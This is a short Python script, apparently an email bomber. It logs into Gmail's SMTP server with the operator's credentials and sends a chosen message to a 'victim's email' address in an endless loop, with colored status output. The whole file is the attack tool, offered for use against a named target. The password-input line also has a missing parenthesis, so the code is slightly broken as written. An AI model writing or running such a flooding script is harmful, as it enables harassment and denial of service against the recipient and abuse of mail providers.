import  smtplib
from colorama import Fore
ymail = input(Fore.RED + "Please write down your email: ")
rmail = input("Please write down the victim's email: ")
passwd = input(str("Please write down your password: ")
message = input("Message: ")
server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
server.login(ymail, passwd)
print (Fore.GREEN + "[*] You logged in Successfully")
while True:
    server.sendmail(ymail, rmail, message)
    print (Fore.CYAN + "[===>] Email sent to: ", rmail)
